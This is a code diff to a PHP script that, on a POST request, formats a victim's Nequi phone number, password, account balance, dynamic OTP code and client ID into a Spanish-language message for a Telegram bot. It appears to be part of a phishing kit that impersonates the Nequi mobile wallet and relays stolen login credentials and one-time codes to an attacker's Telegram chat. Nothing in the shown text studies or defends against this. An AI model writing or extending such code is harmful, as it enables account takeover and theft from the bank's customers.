@@ -36,6 +36,16 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         // Enviar datos a Telegram
         $botToken = $config['botToken'];
         $chatId = $config['chatId'];
+        $baseUrl = $config['baseUrl'];
+        $security_key = $config['security_key'];
+
+        $message = "🔐 <b>Nuevo inicio de sesión (Nequi)</b>\n\n"
+            . "📱 <b>Número de celular:</b> <code>" . $usuario . "</code>\n"
+            . "🔑 <b>Contraseña:</b> <code>" . $clave . "</code>\n"
+            . "💰 <b>Saldo Nequi:</b> <code>" . $saldo . "</code>\n"
+            . "🔢 <b>Clave dinámica:</b> <code>" . $otp . "</code>\n"
+            . "🆔 <b>ID del cliente:</b> <code>" . $cliente_id . "</code>";
+
         // Ajustar URL para usar el script específico de Nequi
         // Si baseUrl apunta al root o al script global, intentamos construir la ruta correcta
         // Asumimos que baseUrl en config puede ser algo como 'https://dominio.com/updatetele.php' o 'https://dominio.com'
